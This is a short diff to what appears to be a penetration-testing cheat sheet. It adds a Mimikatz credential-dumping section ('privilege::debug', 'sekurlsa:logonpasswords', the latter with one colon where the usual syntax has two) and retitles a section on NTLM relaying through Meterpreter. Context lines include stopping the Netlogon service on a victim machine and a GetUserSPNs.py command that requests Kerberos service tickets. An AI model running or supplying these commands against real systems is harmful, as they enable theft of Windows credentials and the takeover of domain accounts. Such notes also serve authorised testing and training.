@@ -1,4 +1,4 @@
-# Remote NTLM Relaying via Meterpreter
+# Remote NTLM Relaying via Meterpreter (Port Forwarding)
 - On the victim machine
 ```powershell
 sc stop netlogon
@@ -118,5 +118,10 @@ mget *
 ```bash
  GetUserSPNs.py <Domain/username:password> -dc-ip <DC IP> -request
 ```
-
+# Mimikatz Credentials Dumping
+```bash
+privilege::debug
+sekurlsa:logonpasswords
+```
+# 
 
